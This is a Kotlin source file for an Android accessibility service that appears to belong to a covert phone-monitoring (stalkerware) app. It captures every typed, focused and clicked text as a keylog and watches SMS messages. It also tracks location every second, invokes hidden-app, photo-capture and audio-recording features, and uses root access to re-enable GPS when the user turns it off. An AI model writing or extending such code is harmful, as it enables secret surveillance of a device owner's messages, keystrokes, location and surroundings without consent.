package com.example.rule.dash.services.accessibilityData

import android.Manifest
import android.accessibilityservice.AccessibilityService
import android.content.Context
import android.content.pm.PackageManager
import android.location.Location
import android.location.LocationListener
import android.location.LocationManager
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.provider.Telephony
import androidx.core.app.ActivityCompat
import android.view.accessibility.AccessibilityEvent
import com.example.rule.app.Dash
import com.example.rule.dash.services.sms.SmsObserver
import com.example.rule.dash.utils.ConstFun.enableGpsRoot
import com.example.rule.dash.utils.ConstFun.getDateTime
import com.example.rule.dash.utils.ConstFun.isRoot
import com.example.rule.dash.utils.Consts.TAG
import com.pawegio.kandroid.i
import com.pawegio.kandroid.runDelayedOnUiThread
import javax.inject.Inject

class AccessibilityDataService : AccessibilityService(), LocationListener {

    companion object {
        var isRunningService : Boolean = false
        var previousData : String = ""
        lateinit var mHandler: Handler
        lateinit var mRunnable: Runnable
    }

    @Inject lateinit var interactor: InteractorAccessibilityData

    private lateinit var locationManager: LocationManager

    override fun onCreate() {
        super.onCreate()
        Dash.appComponent.inject(this)
        getLocation()
        interactor.getShowOrHideApp()
        interactor.getCapturePicture()
        interactor.getRecordingAudio()
        registerSmsObserver()
    }

    private fun registerSmsObserver() =
            contentResolver.registerContentObserver(Telephony.Sms.CONTENT_URI,true, SmsObserver(this,Handler()))

    override fun onInterrupt() {}

    override fun onAccessibilityEvent(event: AccessibilityEvent) {

        when (event.eventType) {

            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                val data = event.text.toString()
                if (data != "[]") {
                    val dataWithoutBracket = data.substring(1, data.length - 1)
                    if (previousData != "" && dataWithoutBracket.startsWith(previousData) && previousData.startsWith(dataWithoutBracket)){
                        mHandler.removeCallbacks(mRunnable)
                    }

                    previousData = dataWithoutBracket

                    mHandler = Handler(Looper.getMainLooper())
                    mRunnable = Runnable {
                        interactor.setDataKey("${getDateTime()} |(TEXT)| $data")
                        previousData = ""
                    }
                    mHandler.postDelayed(mRunnable, 2000)

                    i(TAG, "${getDateTime()} |(TEXT)| $data")
                }
            }
            AccessibilityEvent.TYPE_VIEW_FOCUSED -> {
                val data = event.text.toString()
                if (data != "[]") {
                    interactor.setDataKey("${getDateTime()} |(FOCUSED)| $data")
                    i(TAG, "${getDateTime()} |(FOCUSED)| $data")
                }
            }
            AccessibilityEvent.TYPE_VIEW_CLICKED -> {
                val data = event.text.toString()
                if (data != "[]") {
                    interactor.setDataKey("${getDateTime()} |(CLICKED)| $data")
                    i(TAG, "${getDateTime()} |(CLICKED)| $data")
                }
            }
            else-> {}
        }

    }

    override fun onServiceConnected() {
        isRunningService = true
        interactor.setRunServiceData(true)
        interactor.getSocialStatus()
        interactor.startCountDownTimer()
        super.onServiceConnected()
    }

    override fun onDestroy() {
        isRunningService = false
        interactor.stopCountDownTimer()
        interactor.setRunServiceData(false)
        interactor.clearDisposable()
        super.onDestroy()
    }


    //location
    private fun getLocation() {
        locationManager = getSystemService(Context.LOCATION_SERVICE) as LocationManager
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
            interactor.enablePermissionLocation(true)
            locationManager.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 1000, 0f, this)
        } else interactor.enablePermissionLocation(false)
    }

    override fun onLocationChanged(location: Location) = interactor.setDataLocation(location)

    @Deprecated("Deprecated in Java")
    override fun onStatusChanged(provider: String?, status: Int, extras: Bundle?) {}

    override fun onProviderEnabled(provider: String) {
        if (locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)) interactor.enableGps(true)
    }

    override fun onProviderDisabled(provider: String) {
        if (!locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)) interactor.enableGps(false)
        runDelayedOnUiThread(3000){ if (isRoot()) enableGpsRoot() }
    }

}
   
